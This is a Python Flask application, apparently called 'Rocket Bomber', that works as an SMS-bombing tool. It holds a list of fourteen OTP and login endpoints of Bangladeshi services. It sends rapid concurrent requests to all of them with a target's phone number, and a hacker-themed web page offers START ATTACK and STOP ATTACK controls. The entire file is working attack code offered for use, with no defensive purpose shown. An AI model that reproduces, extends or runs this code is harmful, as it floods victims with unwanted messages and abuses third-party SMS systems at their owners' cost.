from flask import Flask, render_template_string, request, jsonify
import asyncio
import aiohttp
import threading
import random
import time
import json

app = Flask(__name__)

# --- GLOBAL STATE ---
attack_state = {
    "running": False,
    "total_sent": 0,
    "logs": []
}

# ==========================================
# 🚀 ULTRA FAST API LIST (JSON STRUCTURE)
# ==========================================
# এখানে আমরা ফাংশন ব্যবহার না করে লিস্ট ব্যবহার করব যাতে লুপ চালানো ফাস্ট হয়
TARGET_APIS = [
    {"url": "https://api.redx.com.bd/v1/user/request-login-code", "method": "POST", "payload": {"phone": "{num}"}},
    {"url": "https://auth.10minuteschool.com/api/v4/register/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "method": "POST", "payload": {"phone": "{num}", "country_code": "+880"}},
    {"url": "https://api.swap.com.bd/api/v1/send-otp", "method": "POST", "payload": {"phone": "{num}", "type": "login"}},
    {"url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=&v=&os=&osv=&refPartner=", "method": "POST", "payload": {"mobile": "+88{num}"}},
    {"url": "https://api.paperfly.com.bd/api/v1/merchant/registration/check-mobile", "method": "POST", "payload": {"mobile_number": "{num}"}},
    {"url": "https://danafintech.com/api/v1/auth/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"url": "https://api.bongobd.com/api/login/send-otp", "method": "POST", "payload": {"operator": "all", "msisdn": "88{num}"}},
    {"url": "https://prod-api.hoichoi.tv/api/v1/auth/signinup/code", "method": "POST", "payload": {"phoneNumber": "88{num}", "countryCode": "BD", "deviceId": "web", "deviceModel": "chrome"}},
    {"url": "https://api.shikho.com/auth/v2/send/sms", "method": "POST", "payload": {"phone": "{num}", "auth_type": "login"}},
    {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"url": "https://www.priyoshop.com/api/auth/send-otp", "method": "POST", "payload": {"phoneNumber": "{num}"}},
    {"url": "https://api.chardike.com/api/otp/send", "method": "POST", "payload": {"mobile_number": "{num}"}},
    {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", "method": "GET"}
]

# --- ASYNC ENGINE (THE SPEED BEAST) ---
async def send_request(session, api, phone):
    if not attack_state['running']: return
    
    try:
        # Prepare URL and Payload
        url = api["url"].format(num=phone)
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json"
        }
        
        if api["method"] == "POST":
            # Payload এর ভেতরের {num} রিপ্লেস করা
            payload_str = json.dumps(api["payload"]).replace("{num}", phone)
            payload = json.loads(payload_str)
            
            async with session.post(url, json=payload, headers=headers, timeout=5) as response:
                if response.status in [200, 201]:
                    return True
        else:
            async with session.get(url, headers=headers, timeout=5) as response:
                if response.status in [200, 201]:
                    return True
    except:
        return False
    return False

async def run_attack(phone, amount):
    # Number Cleaning
    if phone.startswith("+88"): phone = phone[3:]
    elif phone.startswith("880"): phone = phone[2:]
    
    # Create Async Session with High Limits
    connector = aiohttp.TCPConnector(limit=100) # 100 Connections at once
    async with aiohttp.ClientSession(connector=connector) as session:
        
        while attack_state['running'] and attack_state['total_sent'] < amount:
            tasks = []
            
            # একসাথে ১৫-২০টা রিকোয়েস্ট তৈরি করা (Batch)
            for api in TARGET_APIS:
                if attack_state['total_sent'] >= amount: break
                tasks.append(send_request(session, api, phone))
            
            # ফায়ার! (সবগুলো একসাথে হিট করবে)
            results = await asyncio.gather(*tasks)
            
            # কাউন্ট আপডেট
            success_count = results.count(True)
            attack_state['total_sent'] += success_count
            
            if success_count > 0:
                attack_state['logs'].append(f"🔥 Blast! {success_count} SMS Sent together!")
                if len(attack_state['logs']) > 15: attack_state['logs'].pop(0)

            # সুপার ফাস্ট লুপের জন্য সামান্য ব্রেক (CPU কুল রাখতে)
            await asyncio.sleep(0.5)

    attack_state['running'] = False
    attack_state['logs'].append("✅ ATTACK COMPLETED")

# --- FLASK WRAPPER ---
def start_async_loop(phone, amount):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_attack(phone, amount))

# --- HTML TEMPLATE (Hacker Design) ---
HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rocket Bomber</title>
    <style>
        body { background: #000; color: #00ff41; font-family: monospace; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #00ff41; padding: 30px; border-radius: 10px; width: 350px; box-shadow: 0 0 20px #00ff41; background: #0a0a0a; }
        h1 { margin: 0 0 20px; text-shadow: 0 0 10px #00ff41; animation: blink 1s infinite; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #00ff41; color: white; font-size: 16px; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #00ff41; color: black; font-weight: bold; border: none; cursor: pointer; font-size: 18px; margin-top: 10px; }
        button:hover { background: #00cc33; }
        .stop { background: red; color: white; display: none; }
        .logs { height: 120px; overflow-y: auto; background: #111; border: 1px solid #333; margin-top: 15px; padding: 5px; text-align: left; font-size: 12px; color: #fff; }
        .counter { font-size: 40px; font-weight: bold; margin: 10px 0; }
        @keyframes blink { 50% { opacity: 0.5; } }
    </style>
</head>
<body>
    <div class="box">
        <h1>🚀 ROCKET BOMBER</h1>
        <input type="number" id="num" placeholder="Target Number (01xxxxxxxxx)">
        <input type="number" id="amt" placeholder="Amount" value="50">
        
        <div class="counter" id="sent">0</div>
        
        <button id="startBtn" onclick="start()">START ATTACK</button>
        <button id="stopBtn" class="stop" onclick="stop()">STOP ATTACK</button>
        
        <div class="logs" id="logBox">Waiting for command...</div>
        <p style="font-size:10px; margin-top:15px; opacity:0.7;">DEV: MINHAZUR RAHMAN</p>
    </div>

    <script>
        let interval;
        async function start() {
            let n = document.getElementById('num').value;
            let a = document.getElementById('amt').value;
            if(n.length < 11) return alert("Invalid Number!");

            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'block';
            document.getElementById('logBox').innerHTML = "Initializing Async Engine...";

            await fetch('/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({number: n, amount: a})
            });

            interval = setInterval(update, 500);
        }

        async function stop() {
            await fetch('/stop', { method: 'POST' });
            end();
        }

        function end() {
            clearInterval(interval);
            document.getElementById('startBtn').style.display = 'block';
            document.getElementById('stopBtn').style.display = 'none';
        }

        async function update() {
            let res = await fetch('/status');
            let data = await res.json();
            document.getElementById('sent').innerText = data.sent;
            document.getElementById('logBox').innerHTML = data.logs.join("<br>");
            document.getElementById('logBox').scrollTop = document.getElementById('logBox').scrollHeight;
            
            if(!data.running && data.sent > 0) {
                end();
                alert("Bombing Finished!");
            }
        }
    </script>
</body>
</html>
"""

# --- FLASK ROUTES ---
@app.route('/')
def home(): return render_template_string(HTML)

@app.route('/start', methods=['POST'])
def start_route():
    data = request.json
    attack_state['running'] = True
    attack_state['total_sent'] = 0
    attack_state['logs'] = ["[*] Engine Started..."]
    
    # Threading the Async Loop to avoid blocking Flask
    threading.Thread(target=start_async_loop, args=(data['number'], int(data['amount']))).start()
    return jsonify({"status": "started"})

@app.route('/stop', methods=['POST'])
def stop_route():
    attack_state['running'] = False
    return jsonify({"status": "stopped"})

@app.route('/status')
def status_route():
    return jsonify({
        "running": attack_state['running'],
        "sent": attack_state['total_sent'],
        "logs": attack_state['logs']
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)